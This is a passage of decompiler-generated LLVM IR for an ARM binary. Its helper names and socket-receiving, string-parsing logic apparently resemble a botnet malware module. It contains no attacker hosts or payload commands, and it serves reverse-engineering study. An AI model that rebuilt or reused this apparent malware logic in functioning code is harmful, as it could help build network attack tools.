  %v4_9884 = inttoptr i32 %v0_9880 to i8*
  %v5_9884 = call i32 @util_stristr(i8* %v4_9884, i32 %v2_9874, i32 ptrtoint ([5 x i8]* @global_var_1a7a4.56 to i32))
  store i32 %v5_9884, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_988c = load i8*, i8** %stack_var_-44, align 4
  %v4_988c = ptrtoint i8* %v3_988c to i32
  %v2_9890 = add i32 %v4_988c, %v5_9884
  store i32 %v2_9890, i32* %ip.global-to-local, align 4
  %v5_9894 = inttoptr i32 %v2_9890 to i8*
  store i8* %v5_9894, i8** %stack_var_-44, align 4
  br label %dec_label_pc_9898

dec_label_pc_9898:                                ; preds = %.thread39, %dec_label_pc_9864
  %v0_9d74 = phi i32 [ %v4_985c, %.thread39 ], [ %v2_9890, %dec_label_pc_9864 ]
  %v0_9898 = load i32, i32* @r5, align 4
  %v2_9898 = add i32 %v0_9898, %v0_9d74
  %v3_9898 = inttoptr i32 %v2_9898 to i8*
  %v4_9898 = load i8, i8* %v3_9898, align 1
  %v6_9898 = zext i8 %v4_9898 to i32
  store i32 %v6_9898, i32* %r3.global-to-local, align 4
  %v2_989c = icmp ugt i8 %v4_9898, 33
  store i1 %v2_989c, i1* %cpsr_c.global-to-local, align 1
  %v7_989c = icmp eq i8 %v4_9898, 34
  store i1 %v7_989c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_989c, label %dec_label_pc_9d74, label %dec_label_pc_98a4

dec_label_pc_98a4:                                ; preds = %dec_label_pc_9d74, %dec_label_pc_9898, %dec_label_pc_9d9c
  %v0_98a4 = load i32, i32* @r5, align 4
  store i32 %v0_98a4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_98ac = inttoptr i32 %v0_98a4 to i8*
  %v3_98ac = call i32 @util_atoi(i8* %v2_98ac, i32 10)
  store i32 %v3_98ac, i32* %r0.global-to-local, align 4
  %v1_98b0 = add i32 %v3_98ac, -1
  store i32 %v1_98b0, i32* %r3.global-to-local, align 4
  %v2_98b4 = icmp ugt i32 %v1_98b0, 7
  store i1 %v2_98b4, i1* %cpsr_c.global-to-local, align 1
  %v7_98b4 = icmp eq i32 %v1_98b0, 8
  store i1 %v7_98b4, i1* %cpsr_z.global-to-local, align 1
  %v2_98b8 = xor i1 %v2_98b4, true
  %v3_98b8 = or i1 %v7_98b4, %v2_98b8
  br i1 %v3_98b8, label %dec_label_pc_98cc.preheader, label %dec_label_pc_98e0

dec_label_pc_98cc.preheader:                      ; preds = %dec_label_pc_98a4
  store i32 %v2_879c, i32* %r2.global-to-local, align 4
  %v6_98bc = add i32 %v3_98ac, %v2_879c
  store i32 %v6_98bc, i32* @r4, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98cc
  %v1_98c8 = call i32 @sleep(i32 1)
  store i32 %v1_98c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98cc.preheader, %dec_label_pc_98c8
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @__GI_time(i32* null)
  %v0_98d4 = load i32, i32* @r4, align 4
  %v3_98d4 = icmp uge i32 %v0_98d4, %v2_98d0
  store i1 %v3_98d4, i1* %cpsr_c.global-to-local, align 1
  %v9_98d4 = icmp eq i32 %v0_98d4, %v2_98d0
  store i1 %v9_98d4, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_98dc = xor i1 %v9_98d4, true
  %v3_98dc = and i1 %v3_98d4, %v2_98dc
  br i1 %v3_98dc, label %dec_label_pc_98c8, label %dec_label_pc_98e0

dec_label_pc_98e0:                                ; preds = %dec_label_pc_98cc, %dec_label_pc_98a4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_98e4 = load i8*, i8** %stack_var_-44, align 4
  %v4_98e4 = ptrtoint i8* %v3_98e4 to i32
  store i32 %v4_98e4, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  %v2_98e8 = add i32 %v0_98e8, %v4_98e4
  store i32 %v2_98e8, i32* @r6, align 4
  store i32 %v2_98e8, i32* %r0.global-to-local, align 4
  %v1_98f0 = inttoptr i32 %v2_98e8 to i8*
  %v2_98f0 = call i32 @util_strlen(i8* %v1_98f0)
  store i32 ptrtoint ([5 x i8]* @global_var_1a79c.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98f0, i32* @r1, align 4
  %v0_98fc = load i32, i32* @r6, align 4
  store i32 %v0_98fc, i32* %r0.global-to-local, align 4
  %v4_9900 = inttoptr i32 %v0_98fc to i8*
  %v5_9900 = call i32 @util_stristr(i8* %v4_9900, i32 %v2_98f0, i32 ptrtoint ([5 x i8]* @global_var_1a79c.54 to i32))
  store i32 %v5_9900, i32* %r0.global-to-local, align 4
  %v2_9904 = icmp ugt i32 %v5_9900, 3
  store i1 %v2_9904, i1* %cpsr_c.global-to-local, align 1
  %v7_9904 = icmp eq i32 %v5_9900, 4
  store i1 %v7_9904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9904, label %dec_label_pc_9c60, label %dec_label_pc_990c

dec_label_pc_990c:                                ; preds = %dec_label_pc_98e0
  %v0_990c = load i32, i32* @r5, align 4
  %v1_990c = load i32, i32* @r4, align 4
  %v2_990c = add i32 %v1_990c, %v0_990c
  %v3_990c = inttoptr i32 %v2_990c to i8*
  %v4_990c = load i8, i8* %v3_990c, align 1
  %v6_990c = zext i8 %v4_990c to i32
  store i32 %v6_990c, i32* @r3, align 4
  %v2_9910 = icmp ugt i8 %v4_990c, 46
  store i1 %v2_9910, i1* %cpsr_c.global-to-local, align 1
  %v7_9910 = icmp eq i8 %v4_990c, 47
  store i1 %v7_9910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9910, label %dec_label_pc_9dbc, label %dec_label_pc_9918

dec_label_pc_9918:                                ; preds = %dec_label_pc_9dd8, %dec_label_pc_9dbc, %dec_label_pc_9d24, %dec_label_pc_9d08, %dec_label_pc_990c, %dec_label_pc_9e04, %dec_label_pc_9d50
  %v0_9918 = load i32, i32* %sb.global-to-local, align 4
  %v1_991c = add i32 %v0_9918, 1431
  store i32 %v1_991c, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a778.29 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_9928 = call i32 @memcpy()
  store i32 %v0_9928, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_9930 = load i32, i32* @sl, align 4
  %v3_9930 = add i32 %v2_9930, -1448
  %v4_9930 = inttoptr i32 %v3_9930 to i8*
  store i8 10, i8* %v4_9930, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9938:                                ; preds = %dec_label_pc_9804, %dec_label_pc_9744, %dec_label_pc_9718
  %v0_9938 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9938, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a790.52 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9948 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9938, i32 ptrtoint ([5 x i8]* @global_var_1a790.52 to i32), i32 4)
  %v0_994c = load i32, i32* %sb.global-to-local, align 4
  %v1_9950 = add i32 %v0_994c, 1431
  store i32 %v1_9950, i32* @r4, align 4
  store i32 %v5_9948, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7ac.58 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9950, i32* %r0.global-to-local, align 4
  %v3_9960 = inttoptr i32 %v1_9950 to i8*
  %v4_9960 = call i32 @util_strcmp(i8* %v3_9960, i32 ptrtoint ([5 x i8]* @global_var_1a7ac.58 to i32))
  store i32 %v4_9960, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9964 = icmp eq i32 %v4_9960, 0
  store i1 %v2_9964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9964, label %dec_label_pc_9b14, label %dec_label_pc_996c

dec_label_pc_996c:                                ; preds = %dec_label_pc_9b14, %dec_label_pc_9938
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9970 = load i32, i32* @sl, align 4
  %v3_9970 = add i32 %v2_9970, -1448
  %v4_9970 = inttoptr i32 %v3_9970 to i8*
  store i8 7, i8* %v4_9970, align 1
  br label %dec_label_pc_9974

dec_label_pc_9974:                                ; preds = %bb212, %dec_label_pc_996c
  %v0_9974 = load i32, i32* @r5, align 4
  store i32 %v0_9974, i32* %r2.global-to-local, align 4
  %v0_9978 = load i32, i32* @sl, align 4
  %v1_9978 = add i32 %v0_9978, -1452
  %v2_9978 = inttoptr i32 %v1_9978 to i32*
  %v3_9978 = load i32, i32* %v2_9978, align 4
  store i32 %v3_9978, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9984 = call i32 @__libc_recv(i32 %v3_9978, i32 %v2_827c, i32 %v0_9974, i32 16384)
  store i32 %v4_9984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87ec

dec_label_pc_998c:                                ; preds = %dec_label_pc_8e94
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v0_9994 = load i32, i32* @sl, align 4
  %v1_9994 = add i32 %v0_9994, 660
  %v2_9994 = inttoptr i32 %v1_9994 to i32*
  %v3_9994 = load i32, i32* %v2_9994, align 4
  store i32 %v3_9994, i32* @r4, align 4
  %v3_9998 = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_999c = load i32, i32* @r4, align 4
  store i32 %v0_999c, i32* %r1.global-to-local, align 4
  store i32 %v3_9998, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_99a8 = load i32, i32* @r7, align 4
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v4_99ac = call i32 @util_memsearch(i32 %v0_99a8, i32 %v0_999c, i32 %v3_9998, i32 11)
  store i32 %v4_99ac, i32* %r0.global-to-local, align 4
  %v0_99b0 = load i32, i32* @sl, align 4
  %v1_99b0 = add i32 %v0_99b0, 660
  %v2_99b0 = inttoptr i32 %v1_99b0 to i32*
  %v3_99b0 = load i32, i32* %v2_99b0, align 4
  %v0_99b4 = load i32, i32* @r7, align 4
  %v2_99b4 = add i32 %v0_99b4, %v4_99ac
  store i32 %v2_99b4, i32* @r6, align 4
  store i32 %v4_99ac, i32* @r4, align 4
  %v2_99bc = sub i32 %v3_99b0, %v4_99ac
  store i32 %v2_99bc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7b4.60 to i32), i32* %r2.global-to-local, align 4
  %v0_99c4 = load i32, i32* @r8, align 4
  store i32 %v0_99c4, i32* %r3.global-to-local, align 4
  store i32 %v2_99b4, i32* %r0.global-to-local, align 4
  %v4_99cc = call i32 @util_memsearch(i32 %v2_99b4, i32 %v2_99bc, i32 ptrtoint (i32* @global_var_1a7b4.60 to i32), i32 %v0_99c4)
  store i32 %v4_99cc, i32* %r0.global-to-local, align 4
  %v0_99d0 = load i32, i32* @sl, align 4
  %v1_99d0 = add i32 %v0_99d0, 16
  %v2_99d0 = inttoptr i32 %v1_99d0 to i32*
  %v3_99d0 = load i32, i32* %v2_99d0, align 4
  store i32 %v3_99d0, i32* %r3.global-to-local, align 4
  %v1_99d4 = load i32, i32* @r4, align 4
  %v2_99d4 = add i32 %v1_99d4, %v4_99cc
  store i32 %v2_99d4, i32* @r5, align 4
  %v0_99d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_99d8 = add i32 %v0_99d8, %v2_99d4
  store i32 %v2_99d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_99e0 = icmp ugt i32 %v3_99d0, 3
  store i1 %v2_99e0, i1* %cpsr_c.global-to-local, align 1
  %v7_99e0 = icmp eq i32 %v3_99d0, 4
  store i1 %v7_99e0, i1* %cpsr_z.global-to-local, align 1
  %v3_99e4 = add i32 %v2_99d8, 2115
  %v4_99e4 = inttoptr i32 %v3_99e4 to i8*
  store i8 0, i8* %v4_99e4, align 1
  %v7_99e8 = icmp sgt i32 %v3_99d0, 4
  br i1 %v7_99e8, label %dec_label_pc_99ec, label %dec_label_pc_9b54

dec_label_pc_99ec:                                ; preds = %dec_label_pc_998c, %dec_label_pc_9b54, %dec_label_pc_9b64
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_99f4 = load i32, i32* @sl, align 4
  %v2_99f4 = add i32 %v1_99f4, 12
  %v3_99f4 = inttoptr i32 %v2_99f4 to i32*
  store i32 -1, i32* %v3_99f4, align 4
  %v0_99f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_99f8 = trunc i32 %v0_99f8 to i8
  %v2_99f8 = load i32, i32* @sl, align 4
  %v3_99f8 = add i32 %v2_99f8, -1448
  %v4_99f8 = inttoptr i32 %v3_99f8 to i8*
  store i8 %v1_99f8, i8* %v4_99f8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9a00:                                ; preds = %bb202
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-44, align 4
  %v0_9a0c = load i32, i32* @r6, align 4
  %v1_9a0c = add i32 %v0_9a0c, 4
  %v2_9a0c = inttoptr i32 %v1_9a0c to i8*
  %v3_9a0c = load i8, i8* %v2_9a0c, align 1
  %v4_9a0c = zext i8 %v3_9a0c to i32
  store i32 %v4_9a0c, i32* @r3, align 4
  %v2_9a10 = icmp ugt i8 %v3_9a0c, 114
  store i1 %v2_9a10, i1* %cpsr_c.global-to-local, align 1
  %v7_9a10 = icmp eq i8 %v3_9a0c, 115
  store i1 %v7_9a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a10, label %bb207, label %.thread42

bb207:                                            ; preds = %dec_label_pc_9a00
  store i32 8, i32* @ip, align 4
  store i8* inttoptr (i32 8 to i8*), i8** %stack_var_-44, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_9a00, %bb207
  %v3_9a20 = phi i8* [ inttoptr (i32 7 to i8*), %dec_label_pc_9a00 ], [ inttoptr (i32 8 to i8*), %bb207 ]
  %v4_9a20 = ptrtoint i8* %v3_9a20 to i32
  store i32 %v0_9a0c, i32* @r0, align 4
  %v1_9a28 = load i32, i32* @r5, align 4
  %v2_9a28 = sub i32 %v1_9a28, %v4_9a20
  store i32 %v2_9a28, i32* @r2, align 4
  %v2_9a2c = add i32 %v4_9a20, %v0_9a0c
  store i32 %v2_9a2c, i32* @r1, align 4
  %v3_9a30 = call i32 @memmove(i32 %v0_9a0c, i32 %v2_9a2c, i32 %v2_9a28)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v0_9a38 = load i32, i32* @r7, align 4
  %v5_9a38 = inttoptr i32 %v0_9a38 to i8*
  store i8* %v5_9a38, i8** %stack_var_-44, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_9a40 = load i32, i32* @r4, align 4
  %v2_9a40 = add i32 %v1_9a40, %v2_827c
  %v3_9a40 = inttoptr i32 %v2_9a40 to i8*
  %v4_9a40 = load i8, i8* %v3_9a40, align 1
  %v6_9a40 = zext i8 %v4_9a40 to i32
  store i32 %v6_9a40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a44 = icmp eq i8 %v4_9a40, 0
  store i1 %v2_9a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a44, label %dec_label_pc_9a88, label %dec_label_pc_9a4c

dec_label_pc_9a4c:                                ; preds = %.thread42
  %v2_9a4c = icmp ugt i8 %v4_9a40, 46
  store i1 %v2_9a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_9a4c = icmp eq i8 %v4_9a40, 47
  store i1 %v7_9a4c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a50 = load i32, i32* @r6, align 4
  br i1 %v7_9a4c, label %bb208, label %dec_label_pc_9a58

bb208:                                            ; preds = %dec_label_pc_9a4c
  store i32 %v1_9a50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b48

dec_label_pc_9a58:                                ; preds = %dec_label_pc_9a4c
  store i32 %v0_9a38, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9a68

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a68
  %v2_9a60 = icmp ugt i8 %v4_9a74, 46
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v7_9a60 = icmp eq i8 %v4_9a74, 47
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a60, label %dec_label_pc_9b48, label %dec_label_pc_9a68

dec_label_pc_9a68:                                ; preds = %dec_label_pc_9a60, %dec_label_pc_9a58
  %v0_9a68 = phi i32 [ %v1_9a68, %dec_label_pc_9a60 ], [ %v0_9a38, %dec_label_pc_9a58 ]
  %v1_9a68 = add i32 %v0_9a68, 1
  store i32 %v1_9a68, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v5_9a70 = inttoptr i32 %v1_9a68 to i8*
  store i8* %v5_9a70, i8** %stack_var_-44, align 4
  %v2_9a74 = add i32 %v1_9a68, %v1_9a50
  %v3_9a74 = inttoptr i32 %v2_9a74 to i8*
  %v4_9a74 = load i8, i8* %v3_9a74, align 1
  %v6_9a74 = zext i8 %v4_9a74 to i32
  store i32 %v6_9a74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a78 = icmp eq i8 %v4_9a74, 0
  store i1 %v2_9a78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9a68, i32* %r1.global-to-local, align 4
  store i32 %v2_9a74, i32* %r2.global-to-local, align 4
  br i1 %v2_9a78, label %dec_label_pc_9a88, label %dec_label_pc_9a60

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9a68, %.thread42, %dec_label_pc_9b48
  %v0_9a88 = load i32, i32* @r6, align 4
  store i32 %v0_9a88, i32* %r0.global-to-local, align 4
  %v1_9a8c = inttoptr i32 %v0_9a88 to i8*
  %v2_9a8c = call i32 @util_strlen(i8* %v1_9a8c)
  store i32 %v2_9a8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a90 = icmp eq i32 %v2_9a8c, 0
  store i1 %v2_9a90, i1* %cpsr_z.global-to-local, align 1
  %tmp209 = icmp slt i32 %v2_9a8c, 1
  br i1 %tmp209, label %dec_label_pc_9ab4, label %dec_label_pc_9a98

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a88
  %v0_9a98 = load i32, i32* @r6, align 4
  store i32 %v0_9a98, i32* %r0.global-to-local, align 4
  %v1_9a9c = inttoptr i32 %v0_9a98 to i8*
  %v2_9a9c = call i32 @util_strlen(i8* %v1_9a9c)
  store i32 %v2_9a9c, i32* %r0.global-to-local, align 4
  %v1_9aa0 = add i32 %v2_9a9c, -127
  %v2_9aa0 = icmp ugt i32 %v2_9a9c, 126
  store i1 %v2_9aa0, i1* %cpsr_c.global-to-local, align 1
  %v3_9aa0 = sub i32 126, %v2_9a9c
  %v4_9aa0 = and i32 %v3_9aa0, %v2_9a9c
  %v5_9aa0 = icmp slt i32 %v4_9aa0, 0
  %v6_9aa0 = icmp slt i32 %v1_9aa0, 0
  %v7_9aa0 = icmp eq i32 %v2_9a9c, 127
  store i1 %v7_9aa0, i1* %cpsr_z.global-to-local, align 1
  %v7_9aa4 = icmp sgt i32 %v2_9a9c, 127
  br i1 %v7_9aa4, label %.thread45, label %bb210

bb210:                                            ; preds = %dec_label_pc_9a98
  %v8_9aa4 = load i32, i32* %sb.global-to-local, align 4
  %v9_9aa8 = add i32 %v8_9aa4, 789
  store i32 %v9_9aa8, i32* %r0.global-to-local, align 4
  %v8_9aac = load i32, i32* @r6, align 4
  store i32 %v8_9aac, i32* %r1.global-to-local, align 4
  br label %.thread45

.thread45:                                        ; preds = %dec_label_pc_9a98, %bb210
  store i32 39604, i32* @lr, align 4
  %v3_9ab0 = xor i1 %v6_9aa0, %v5_9aa0
  %v4_9ab0 = or i1 %v7_9aa0, %v3_9ab0
  call void @__pseudo_cond_branch(i1 %v4_9ab0, i32 ptrtoint (i32* @global_var_118cc.61 to i32))
  br label %dec_label_pc_9ab4

dec_label_pc_9ab4:                                ; preds = %dec_label_pc_9a88, %.thread45
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9ab8 = load i8*, i8** %stack_var_-44, align 4
  %v4_9ab8 = ptrtoint i8* %v3_9ab8 to i32
  %v0_9abc = load i32, i32* @r6, align 4
  %v1_9abc = add i32 %v0_9abc, 1
  store i32 %v1_9abc, i32* @r5, align 4
  %v2_9ac0 = add i32 %v1_9abc, %v4_9ab8
  store i32 %v2_9ac0, i32* %r0.global-to-local, align 4
  %v1_9ac4 = inttoptr i32 %v2_9ac0 to i8*
  %v2_9ac4 = call i32 @util_strlen(i8* %v1_9ac4)
  store i32 %v2_9ac4, i32* %r0.global-to-local, align 4
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 254
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 255
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v8_9acc = icmp sgt i32 %v2_9ac4, 255
  br i1 %v8_9acc, label %dec_label_pc_9654, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ab4
  %v0_9ad0 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ad4 = add i32 %v0_9ad0, 533
  store i32 %v1_9ad4, i32* @r4, align 4
  store i32 %v1_9ad4, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9ae0 = call i32 @util_zero(i32 %v1_9ad4, i32 255)
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9ae8 = load i8*, i8** %stack_var_-44, align 4
  %v4_9ae8 = ptrtoint i8* %v3_9ae8 to i32
  %v0_9aec = load i32, i32* @r5, align 4
  %v2_9aec = add i32 %v0_9aec, %v4_9ae8
  store i32 %v2_9aec, i32* %r0.global-to-local, align 4
  %v1_9af0 = inttoptr i32 %v2_9aec to i8*
  %v2_9af0 = call i32 @util_strlen(i8* %v1_9af0)
  store i32 %v2_9af0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9af4 = icmp eq i32 %v2_9af0, 0
  store i1 %v2_9af4, i1* %cpsr_z.global-to-local, align 1
  %tmp211 = icmp slt i32 %v2_9af0, 1
  br i1 %tmp211, label %dec_label_pc_9654, label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9ad0
  %v3_9b00 = load i8*, i8** %stack_var_-44, align 4
  %v4_9b00 = ptrtoint i8* %v3_9b00 to i32
  %v0_9b04 = load i32, i32* @r4, align 4
  store i32 %v0_9b04, i32* @r0, align 4
  %v0_9b08 = load i32, i32* @r5, align 4
  %v2_9b08 = add i32 %v0_9b08, %v4_9b00
  store i32 %v2_9b08, i32* %r1.global-to-local, align 4
  %v2_9b0c = inttoptr i32 %v0_9b04 to i8*
  %v3_9b0c = call i32 @util_strcpy(i8* %v2_9b0c, i32 %v2_9b08)
  store i32 %v3_9b0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9938
  %v0_9b14 = load i32, i32* @r4, align 4
  store i32 %v0_9b14, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a778.29 to i32), i32* %r1.global-to-local, align 4
  %v3_9b1c = inttoptr i32 %v0_9b14 to i8*
  %v4_9b1c = call i32 @util_strcmp(i8* %v3_9b1c, i32 ptrtoint ([4 x i8]* @global_var_1a778.29 to i32))
  store i32 %v4_9b1c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b20 = icmp eq i32 %v4_9b1c, 0
  store i1 %v2_9b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9b20, label %bb212, label %dec_label_pc_996c

bb212:                                            ; preds = %dec_label_pc_9b14
  %v0_9b28 = load i32, i32* %fp.global-to-local, align 4
  %v1_9b28 = load i32, i32* @r5, align 4
  %v3_9b28 = icmp uge i32 %v0_9b28, %v1_9b28
  store i1 %v3_9b28, i1* %cpsr_c.global-to-local, align 1
  %v9_9b28 = icmp eq i32 %v0_9b28, %v1_9b28
  store i1 %v9_9b28, i1* %cpsr_z.global-to-local, align 1
  %v7_9b2c = icmp sgt i32 %v0_9b28, %v1_9b28
  %. = select i1 %v7_9b2c, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9b34 = trunc i32 %. to i8
  %v10_9b34 = load i32, i32* @sl, align 4
  %v11_9b34 = add i32 %v10_9b34, -1448
  %v12_9b34 = inttoptr i32 %v11_9b34 to i8*
  store i8 %v9_9b34, i8* %v12_9b34, align 1
  br label %dec_label_pc_9974

dec_label_pc_9b40:                                ; preds = %dec_label_pc_8f38
  %v0_9b40 = load i32, i32* @r4, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* @sl, align 4
  %v3_9b40 = add i32 %v2_9b40, -1448
  %v4_9b40 = inttoptr i32 %v3_9b40 to i8*
  store i8 %v1_9b40, i8* %v4_9b40, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9b48:                                ; preds = %dec_label_pc_9a60, %bb208
  %v2_9b4c = phi i32 [ %v1_9a50, %bb208 ], [ %v2_9a74, %dec_label_pc_9a60 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9b4c = inttoptr i32 %v2_9b4c to i8*
  store i8 0, i8* %v3_9b4c, align 1
  br label %dec_label_pc_9a88

dec_label_pc_9b54:                                ; preds = %dec_label_pc_998c
  %v0_9b54 = load i32, i32* @r6, align 4
  store i32 %v0_9b54, i32* %r0.global-to-local, align 4
  %v1_9b58 = inttoptr i32 %v0_9b54 to i8*
  %v2_9b58 = call i32 @util_strlen(i8* %v1_9b58)
  store i32 %v2_9b58, i32* %r0.global-to-local, align 4
  %v2_9b5c = icmp ugt i32 %v2_9b58, 126
  store i1 %v2_9b5c, i1* %cpsr_c.global-to-local, align 1
  %v7_9b5c = icmp eq i32 %v2_9b58, 127
  store i1 %v7_9b5c, i1* %cpsr_z.global-to-local, align 1
  %v8_9b60 = icmp sgt i32 %v2_9b58, 127
  br i1 %v8_9b60, label %dec_label_pc_99ec, label %dec_label_pc_9b64

dec_label_pc_9b64:                                ; preds = %dec_label_pc_9b54
  %v0_9b64 = load i32, i32* @sl, align 4
  %v1_9b64 = add i32 %v0_9b64, 16
  %v2_9b64 = inttoptr i32 %v1_9b64 to i32*
  %v3_9b64 = load i32, i32* %v2_9b64, align 4
  %v1_9b68 = and i32 %v3_9b64, 33554432
  %v2_9b68 = icmp ne i32 %v1_9b68, 0
  store i1 %v2_9b68, i1* %cpsr_c.global-to-local, align 1
  %v3_9b68 = mul i32 %v3_9b64, 128
  %v1_9b6c = add i32 %v3_9b68, 1472
  %v0_9b70 = load i32, i32* @r6, align 4
  store i32 %v0_9b70, i32* %r1.global-to-local, align 4
  %v0_9b74 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b74 = add i32 %v1_9b6c, %v0_9b74
  store i32 %v2_9b74, i32* @r0, align 4
  %v2_9b78 = inttoptr i32 %v2_9b74 to i8*
  %v3_9b78 = call i32 @util_strcpy(i8* %v2_9b78, i32 %v0_9b70)
  store i32 %v3_9b78, i32* %r0.global-to-local, align 4
  %v0_9b7c = load i32, i32* @sl, align 4
  %v1_9b7c = add i32 %v0_9b7c, 16
  %v2_9b7c = inttoptr i32 %v1_9b7c to i32*
  %v3_9b7c = load i32, i32* %v2_9b7c, align 4
  %v1_9b80 = and i32 %v3_9b7c, 33554432
  %v2_9b80 = icmp ne i32 %v1_9b80, 0
  store i1 %v2_9b80, i1* %cpsr_c.global-to-local, align 1
  %v3_9b80 = mul i32 %v3_9b7c, 128
  %v1_9b84 = add i32 %v3_9b80, 1472
  %v0_9b88 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b88 = add i32 %v1_9b84, %v0_9b88
  store i32 %v2_9b88, i32* @r4, align 4
  store i32 %v2_9b88, i32* %r0.global-to-local, align 4
  %v1_9b90 = inttoptr i32 %v2_9b88 to i8*
  %v2_9b90 = call i32 @util_strlen(i8* %v1_9b90)
  store i32 ptrtoint (i32* @global_var_1aab0.63 to i32), i32* %r1.global-to-local, align 4
  %v0_9b98 = load i32, i32* @r4, align 4
  %v2_9b98 = add i32 %v0_9b98, %v2_9b90
  store i32 %v2_9b98, i32* @r0, align 4
  %v2_9b9c = inttoptr i32 %v2_9b98 to i8*
  %v3_9b9c = call i32 @util_strcpy(i8* %v2_9b9c, i32 ptrtoint (i32* @global_var_1aab0.63 to i32))
  store i32 %v3_9b9c, i32* %r0.global-to-local, align 4
  %v0_9ba0 = load i32, i32* @r5, align 4
  %v1_9ba0 = add i32 %v0_9ba0, 3
  store i32 %v1_9ba0, i32* @r5, align 4
